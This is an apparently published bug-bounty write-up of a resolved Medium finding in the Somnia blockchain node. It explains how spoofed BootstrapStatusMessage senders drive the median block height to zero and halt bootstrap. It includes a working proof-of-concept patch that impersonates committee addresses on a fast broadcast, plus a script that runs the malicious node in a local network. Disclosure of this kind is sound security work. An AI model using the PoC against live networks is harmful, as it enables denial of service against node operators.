---
title: "Node liveness halt via spoofed bootstrap status messages"
date: 2025-09-17 14:00:00 +0700
categories: [Audits, Somnia]
tags: [cpp, somnia, dos, bootstrap, spoofing, hackenproof]
description: >-
  Spoofed BootstrapStatusMessage can force median executed height to 0 and halt node liveness — a confirmed Medium finding on Somnia (SOMNIAAC-177).
image: /assets/img/somnia.png
---

## Metadata

- **Severity:** Medium
- **Status:** Resolved
- **Category:** Blockchain
- **Created by:** uint256vieet
- **Created at:** September 17, 2025
- **Reward:** 2563.29 $

## Summary

A malicious peer can advertise fabricated bootstrap status updates that impersonate committee participants and force a node's view of network progress to regress to block 0.

This biases the node's up-to-date check and can halt operation in production/mainnet, resulting in persistent denial-of-service against any nodes.

## Vulnerability Details

- The bootstrap flow aggregates executed block heights advertised by peers and tracks them per logical sender identity in `latest_received_executed_blocks`. The node's readiness gate (e.g., `NodeUpToDate()`) relies on an aggregate of these values (median/threshold) to decide when to proceed.
- For this `BootstrapStatusMessage` message type, the network receive path (e.g., `TryReceiveDataFromPeer()`) does not override or validate `message.sender`, allowing a remote to set it arbitrarily.
- As a result, a single malicious connection can submit multiple crafted messages that appear to originate from different `committee addresses` with an extremely low `latest_executed_block_number` (e.g., 0).
- A racing attacker can continually re-inject low heights to win over honest updates.

```cpp
// And dispatch the message.
Match(
    [&](BootstrapStatusMessage&& message) {
        //<----HERE lack of Override sender to prevent spoofing.
      node_actor_manager.boostrap_actor.ForceNonBlockingSend(std::move(message));
    },
```

```cpp
  [&](BootstrapStatusMessage&& message) {
    latest_received_executed_blocks.insert_or_assign(message.sender,
    //<-----HERE malicious peer can set any message.sender(even committee address)
                                                     message.latest_executed_block_number);

    if (latest_locally_finished_ledger_block) {
      // We have already started the chain.
      return;
    }
```

## Impact Details

**CRITICAL**

- **Primary impact (DoS/liveness halt)**: A remote adversary can indefinitely prevent a node from completing bootstrap or cause it to believe it is not up to date, halting API servicing of all nodes (equally to total network shutdown)

## References

- Code path: `somnia/node/bootstrap_actor.cc` (handler for `BootstrapStatusMessage`)
- Data structure: `latest_received_executed_blocks`
- Related logic: `NodeUpToDate()`, `TryReceiveDataFromPeer()`

## Proof of Concept

### Craft a malicious node

Apply this diff below for a malicious node:

```diff
diff --git a/somnia/node/bootstrap_actor.cc b/somnia/node/bootstrap_actor.cc
index f62b585f..052796a9 100644
--- a/somnia/node/bootstrap_actor.cc
+++ b/somnia/node/bootstrap_actor.cc
@@ -1,8 +1,10 @@
 #include "bootstrap_actor.h"
 #include "node_actor_manager.h"
+#include "somnia/lib/address.h"
 #include "somnia/lib/common_basic.h"
 #include "somnia/lib/logging.h"
 #include "somnia/lib/metrics.h"
+#include <array>
 namespace somnia {

 BootstrapActor::BootstrapActor(NodeActorManager& node_actor_manager,
@@ -321,8 +323,7 @@ void BootstrapActor::BroadcastStatusMessage() {
   // Broadcast the status to all peers.
   BootstrapStatusMessage status_message;

-  // Add the most recently executed block.
-  status_message.latest_executed_block_number = latest_locally_finished_ledger_block->block_number;
+  status_message.latest_executed_block_number = 0;  //@audit we will set to 0

   // Add the latest startable block, whose epoch interval matches our configured startup interval.
   auto latest_startable_block = storage_database.GetSmashData<std::pair<LedgerBlockNumber, Hash>>(
@@ -360,7 +361,15 @@ void BootstrapActor::BroadcastStatusMessage() {
       StorageKey::SingletonKey(StorageKeyType::GENESIS_BLOCK_HASH));

   // And sign the status message.
-  status_message.sender = our_private_keys.GetAddress();
+  //@audit Hardcode sender to rotate across committee addresses: committee0, committee1, ...
+
+  static const std::array<Address, 3> kCommitteeSenders = {
+      HexStringToAddress("0xd1d8a091d3644d1a8ee6b995939bf85c41215b6f"),
+      HexStringToAddress("0x0b5a1df83bf4430a8433bb8e375bb5b4e02411b5"),
+      HexStringToAddress("0x9e3794a4c84a63399253af258183429896bbc81d")};
+  status_message.sender = kCommitteeSenders[next_committee_sender_index];
+  next_committee_sender_index = (next_committee_sender_index + 1) % kCommitteeSenders.size();
+
   status_message.signature = ecdsa::CreateSignature(status_message.CalculateMessageHash(),
                                                     our_private_keys.GetECDSAPrivateKey());

diff --git a/somnia/node/bootstrap_actor.h b/somnia/node/bootstrap_actor.h
index ce2493b0..4788e7c0 100644
--- a/somnia/node/bootstrap_actor.h
+++ b/somnia/node/bootstrap_actor.h
@@ -126,6 +126,8 @@ private:
   std::atomic_bool node_should_continue_running = true;
   UnorderedMap<Address, LedgerBlockNumber> latest_received_executed_blocks;
   bool previous_ready_state = false;
+  // Index used to round-robin hardcoded committee sender addresses across broadcasts.
+  std::size_t next_committee_sender_index = 0;

   virtual void OnStart() override;
   virtual void Tick() override;
diff --git a/somnia/parameters/local_parameters.h b/somnia/parameters/local_parameters.h
index d2d2b652..398d8f0b 100644
--- a/somnia/parameters/local_parameters.h
+++ b/somnia/parameters/local_parameters.h
@@ -197,7 +197,7 @@ struct BootstrapParameters {
   RealClock::duration time_to_wait_for_bootstrap = std::chrono::seconds(4);

   HELP("The interval to broadcast this node's bootstrap status")
-  RealClock::duration broadcast_interval = std::chrono::seconds(1);
+  RealClock::duration broadcast_interval = std::chrono::milliseconds(100);//@audit 100ms for faster broadtcast than honestnode

   HELP("The interval to tick the node's bootstrap actor")
   RealClock::duration tick_interval = std::chrono::seconds(1);
```

This malicious node will do the following:

- Broadcast at a faster interval `(100ms)` than a normal node `(1s)` to increase the likelihood of setting the `latest_executed_block` for the committee. (Actually, 50% of the committee is enough because the mechanism calculates the median `latest_executed_block` from all peers.)
- On each `tick()` it will broadcast a fake `BootstrapStatusMessage` to its peers that overrides honest nodes status on every `NodeUpToDate tick()`.

### Modify the script to start the network with honest nodes 1, 2, and 3, and node 4 using the malicious binary

```diff
diff --git a/ci/run-local-deployment.sh b/ci/run-local-deployment.sh
index ab51ed8c..a9bef38e 100755
--- a/ci/run-local-deployment.sh
+++ b/ci/run-local-deployment.sh
@@ -16,8 +16,10 @@ echo "Starting $NUM_VALIDATORS validators."
 export LOCAL_DEPLOYMENT_PID=$(echo $$)

 # Build somnia
-bazel build --config release //somnia
+bazel build --jobs 4  --config release //somnia
 export SOMNIA_BIN=bazel-bin/somnia/somnia
+export SOMNIA_BIN_MALICIOUS=bazel-bin/somnia/somnia-malicious
+

 # Ensure the test user set exists, which is used to build the genesis state,
 # and generate the transactions.
@@ -109,7 +111,12 @@ function runNode {

     # Start the node.
     echo "Starting validator $validator_index on ports $protocol_port and $data_port"
-    $SOMNIA_BIN node \
+    # Use the custom binary for validator index 3 (the 4th malicious node).
+    NODE_BIN=$SOMNIA_BIN
+    if [ "$validator_index" -eq 3 ]; then
+        NODE_BIN=$SOMNIA_BIN_MALICIOUS
+    fi
+    $NODE_BIN node \
         --local-parameters.protocol-listen-port $protocol_port \
         --local-parameters.data-listen-port $data_port \
         --local-parameters.api-http-port $api_http_port \
```

Add this log to the normal node's `NodeUpToDate` function to make the bug easy to notice — we will see the `MEDIAN_BLOCK` drop to zero:

```cpp
  // And compare this to our local block number.
  const auto local_block = latest_locally_finished_ledger_block->block_number;
  const auto threshold =
      chain_parameters.local_parameters.bootstrap_parameters.latest_block_threshold;
  const bool in_range = (local_block <= median_block_number + threshold) &&
      (local_block + threshold >= median_block_number);
  spdlog::info(
      "--------------------Bootstrap readiness check: local_block={} median_block={} threshold={} "
      "in_range={}",
      local_block, median_block_number, threshold, in_range);
  return in_range;
}
```

### Start the network normally

```shell
./ci/run-local-deployment.sh
```

The logs show that `node1` is overridden by fake data from malicious `node4`, making honest nodes unable to function (median executed block driven to 0).
